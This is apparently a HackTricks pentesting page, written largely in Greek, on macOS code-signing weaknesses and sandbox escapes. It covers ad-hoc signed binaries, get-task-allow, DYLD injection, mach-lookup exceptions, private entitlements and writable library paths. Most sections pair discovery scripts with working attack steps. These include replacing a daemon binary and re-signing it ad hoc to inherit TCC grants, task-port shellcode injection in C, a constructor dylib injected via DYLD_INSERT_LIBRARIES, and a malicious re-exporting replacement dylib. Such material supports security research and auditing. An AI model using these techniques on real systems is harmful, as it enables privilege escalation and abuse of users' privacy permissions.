# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Βασικές Πληροφορίες

**Ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature με **χωρίς αλυσίδα πιστοποιητικών** — είναι ένα hash του κώδικα χωρίς επαλήθευση ταυτότητας developer. Η προέλευση του binary δεν μπορεί να ανιχνευθεί σε κανέναν developer ή οργανισμό.

On Apple Silicon Macs, όλα τα executables απαιτούν τουλάχιστον μια ad-hoc signature. Αυτό σημαίνει ότι θα βρείτε ad-hoc signatures σε πολλά development tools, Homebrew packages, και third-party utilities.

### Γιατί έχει σημασία

- **No verifiable identity** — το binary μπορεί να αντικατασταθεί χωρίς να ανιχνευθεί από ελέγχους βάσει ταυτότητας
- Τα third-party ad-hoc binaries σε **privileged positions** (FDA, daemon, helpers) είναι στόχοι υψηλής προτεραιότητας
- Σε κάποιες διαμορφώσεις, οι ad-hoc signatures μπορεί **να μην επαληθεύονται τόσο αυστηρά** όσο το developer-signed code
- Τα ad-hoc signed binaries που έχουν **TCC grants** είναι ιδιαίτερα πολύτιμα — τα grants επιμένουν ακόμη και αν το περιεχόμενο του binary αλλάξει (εξαρτάται από το πώς το TCC keyed the grant)

### Ανακάλυψη
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Επίθεση: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Διεργασίες με δυνατότητα αποσφαλμάτωσης (get-task-allow)

### Βασικές Πληροφορίες

Το **`com.apple.security.get-task-allow`** entitlement (ή η σημαία `CS_GET_TASK_ALLOW`) επιτρέπει **σε οποιαδήποτε διεργασία να επισυναφθεί ως debugger**, να διαβάζει μνήμη, να τροποποιεί καταχωρητές, να εισάγει κώδικα και να ελέγχει την εκτέλεση.

Αυτό προορίζεται **μόνο για development builds**. Ωστόσο, κάποια third-party binaries αποστέλλονται με αυτό το entitlement σε production.

> [!CAUTION]
> Ένα production binary με `get-task-allow` είναι ένα **instant exploitation primitive**. Οποιαδήποτε τοπική διεργασία μπορεί να καλέσει `task_for_pid()`, να πάρει το Mach task port του στόχου, και να εισάγει αυθαίρετο κώδικα που εκτελείται με τα entitlements του στόχου, τις TCC grants, και το security context.

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Επίθεση: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Χωρίς Επαλήθευση Βιβλιοθηκών + DYLD Περιβάλλον

### Ο Θανάσιμος Συνδυασμός

Όταν ένα binary έχει **και τα δύο**:
- `com.apple.security.cs.disable-library-validation` (φορτώνει οποιοδήποτε dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (δέχεται DYLD env vars)

Αυτό είναι ένα **εγγυημένο code injection primitive** — `DYLD_INSERT_LIBRARIES` λειτουργεί άψογα.

### Ανακάλυψη
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Επίθεση: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Προσωρινές Εξαιρέσεις Sandbox

### Πώς Αδυνατίζουν το Sandbox

Οι προσωρινές εξαιρέσεις του Sandbox (`com.apple.security.temporary-exception.*`) ανοίγουν τρύπες στο App Sandbox:

| Εξαίρεση | Τι Επιτρέπει |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε system-wide XPC/Mach services |
| `temporary-exception.files.absolute-path.read-write` | Ανάγνωση/εγγραφή αρχείων εκτός του container της εφαρμογής |
| `temporary-exception.iokit-user-client-class` | Άνοιγμα συνδέσεων IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Ανάγνωση προτιμήσεων άλλων εφαρμογών |
| `temporary-exception.files.home-relative-path.read-write` | Πρόσβαση σε μονοπάτια σχετικά με το `~` |

### Mach-Lookup Εξαιρέσεις = Sandbox Escape Primitive

Η πιο επικίνδυνη εξαίρεση είναι **mach-lookup** — επιτρέπει σε μια εφαρμογή που βρίσκεται σε sandbox να επικοινωνήσει με privileged daemons:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Επίθεση: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Ιδιωτικά Entitlements της Apple

### Τι είναι

Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **εσωτερικά APIs της Apple** που δεν είναι τεκμηριωμένα ή διαθέσιμα σε τρίτους developers. Τα τρίτα binaries με ιδιωτικά entitlements τα απέκτησαν μέσω enterprise cert, MDM, ή διανομής εκτός App-Store.

### Επικίνδυνα Ιδιωτικά Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Πλήρης ανάγνωση/εγγραφή στη βάση δεδομένων TCC |
| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένες υπηρεσίες TCC |
| `com.apple.private.security.no-sandbox` | Εκτέλεση χωρίς sandbox |
| `com.apple.private.iokit` | Άμεση πρόσβαση σε IOKit drivers |
| `com.apple.private.kernel.*` | Πρόσβαση στο kernel interface |
| `com.apple.private.xpc.launchd.job-label` | Καταχώρηση/διαχείριση launchd jobs |
| `com.apple.rootless.install` | Εγγραφή σε διαδρομές προστατευμένες από SIP |

### Ανακάλυψη
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Προσαρμοσμένα Προφίλ Sandbox (SBPL)

### Τι Είναι

Τα binaries μπορούν να διανέμονται με **προσαρμοσμένα προφίλ Sandbox** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα προφίλ μπορούν να είναι πιο περιοριστικά ή **πιο επιεική** σε σχέση με το προεπιλεγμένο App Sandbox.

### Έλεγχος Προσαρμοσμένων Προφίλ
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Εγγράψιμες διαδρομές βιβλιοθηκών

### Τι είναι

Όταν ένα binary φορτώνει μια dynamic library από μια διαδρομή στην οποία ο τρέχων χρήστης μπορεί να **γράψει**, η βιβλιοθήκη μπορεί να αντικατασταθεί με κακόβουλο κώδικα.

### Εντοπισμός
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Επίθεση: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Αναφορές

* [Apple Developer — Οδηγός Υπογραφής Κώδικα](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library-validation/)

{{#include ../../../banners/hacktricks-training.md}}
